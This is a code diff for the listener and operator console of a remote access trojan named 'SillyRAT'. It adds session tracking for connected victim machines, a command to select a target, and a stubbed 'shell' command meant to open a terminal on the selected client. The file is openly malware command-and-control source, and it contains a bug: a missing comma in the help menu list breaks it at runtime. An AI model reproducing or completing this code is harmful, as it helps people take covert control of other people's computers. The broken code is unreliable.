@@ -2,6 +2,7 @@ import sys
 import os
 import socket
 import time
+import tabulate
 import argparse
 import threading
 
@@ -56,11 +57,19 @@ class PULL:
         self.UNDERLINE = ''
         self.END = ''
 
-    def get_com(self):
-        return input(self.DARKCYAN + "$" + self.END + self.RED + " " + self.END)
+    def get_com(self, mss=()):
+        if mss:
+            rtval = input(self.DARKCYAN + "$" + self.END + " [" + self.GREEN + mss[1].ip + self.END + ":" + self.RED + str(mss[1].port) + self.END + "] ")
+        else:
+            rtval = input(self.DARKCYAN + "$" + self.END + " ")
+        rtval = rtval.rstrip(" ").lstrip(" ")
+        return rtval
 
     def print(self, mess):
         print(self.GREEN + "[" + self.UNDERLINE + "*" + self.END + self.GREEN + "] " + self.END + mess + self.END)
+
+    def error(self, mess):
+        print(self.RED + "[" + self.UNDERLINE + "!" + self.END + self.RED + "] " + self.END + mess + self.END)
 
     def exit(self, mess=""):
         sys.exit(self.RED + "[" + self.UNDERLINE + "~" + self.END + self.RED + "] " + self.END + mess + self.END)
@@ -68,22 +77,111 @@ class PULL:
     def logo(self):
         print(self.DARKCYAN + __LOGO__ % self.YELLOW + self.END)
 
+    def help_c_current(self):
+        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
+        lister  = [
+            ('help', 'Shows manual for commands'),
+            ('sessions', 'Show all connected clients to the server'),
+            ('connect', 'Connect to a Specific Client'),
+            ('shell'  , 'Launch a New Terminal/Shell.')
+            ('exit', 'Exit from SillyRAT!')
+        ]
+        sys.stdout.write("\n")
+        print(tabulate.tabulate(lister, headers=headers))
+        sys.stdout.write("\n")
+
+    def help_c_general(self):
+        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
+        lister  = [
+            ('help', 'Shows manual for commands'),
+            ('sessions', 'Show all connected clients to the server'),
+            ('connect', 'Connect to a Specific Client'),
+            ('exit', 'Exit from SillyRAT!')
+        ]
+        sys.stdout.write("\n")
+        print(tabulate.tabulate(lister, headers=headers))
+        sys.stdout.write("\n")
+
 pull = PULL()
 
 class CLIENT:
+    
+    STATUS = "Active"
 
     def __init__(self, sock, addr):
         self.sock    = sock
-        self.address = addr
+        self.ip      = addr[0]
+        self.port    = addr[1]
 
     def engage(self):
         return
 
-class INTERFACE:
+class COMMCENTER:
+
+    CLIENTS = []
+    COUNTER = 0
+    CURRENT = ()    #### Current Target Client ####
+
+    def c_help(self, vals):
+        if len(vals) > 1:
+            print("worker")
+        else:
+            if self.CURRENT:
+                pull.help_c_current()
+            else:
+                pull.help_c_general()
+
+    def get_valid(self, _id):
+        for client in self.CLIENTS:
+            if client[0] == int(_id):
+                return client
+
+        return False
+
+    def c_ping(self, _id):
+        return
+
+    def c_connect(self, args):
+        if len(args) == 2:
+            tgt = self.get_valid(args[1])
+            if tgt:
+                self.CURRENT = tgt
+            else:
+                sys.stdout.write("\n")
+                pull.error("No client is associated with that ID!")
+                sys.stdout.write("\n")
+        else:
+            sys.stdout.write("\n")
+            pull.error("Invalid Syntax!")
+            sys.stdout.write("\n")
+
+    def c_sessions(self):
+        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
+        lister = []
+
+        for client in self.CLIENTS:
+            toappend = []
+            toappend.append(pull.RED + str(client[0]) + pull.END)
+            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
+            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
+            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
+            lister.append(toappend)
+
+        sys.stdout.write("\n")
+        print(tabulate.tabulate(lister, headers=headers))
+        sys.stdout.write("\n")
+
+    def c_shell(self):
+        return
+
+    def c_exit(self):
+        sys.stdout.write("\n")
+        pull.exit("See Ya!\n")
+
+class INTERFACE(COMMCENTER):
 
     SOCKET  = None
     RUNNER  = True
-    CLIENTS = {}
 
     def __init__(self, prs):
         self.address = prs.address
@@ -110,38 +208,48 @@ class INTERFACE:
 
         while self.RUNNER:
             conn, addr = self.SOCKET.accept()
-            
-            if addr[0] not in tuple(self.CLIENTS.keys()):
-                client = CLIENT(conn, addr)
-                client.engage()
+            is_valid = True
 
-                self.CLIENTS[addr[0]] = (
-                    addr[0],
-                    addr[1],
+            self.COUNTER += 1
+            client = CLIENT(conn, addr)
+            client.engage()
+
+            self.CLIENTS.append(
+                (
+                    self.COUNTER,
                     client
                 )
-
-            #client = CLIENT(conn, addr)
-            #client.engage()
+            )
+                
 
     def accept(self):
         t = threading.Thread(target=self.accept_threads)
         t.daemon = True
         t.start()
 
-    def execute(self, val):
-        if val == "exit":
-            pull.exit()
-        elif val == "sessions":
-            print("Sessions")
+    #### Commands ####
+
+    def execute(self, vals):
+        if vals:
+            if vals[0] == "exit":
+                self.c_exit()
+            elif vals[0] == "help":
+                self.c_help(vals)
+            elif vals[0] == "sessions":
+                self.c_sessions()
+            elif vals[0] == "ping":
+                self.c_ping(vals)
+            elif vals[0] == "connect":
+                self.c_connect(vals)
+            elif vals[0] == "shell":
+                self.c_shell()
 
     def launch(self):
         pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
 
         while True:
-            val = pull.get_com()
-
-            self.execute(val)
+            val = pull.get_com(self.CURRENT)
+            self.execute(val.split(" "))
 
     def close(self):
         self.SOCKET.close()
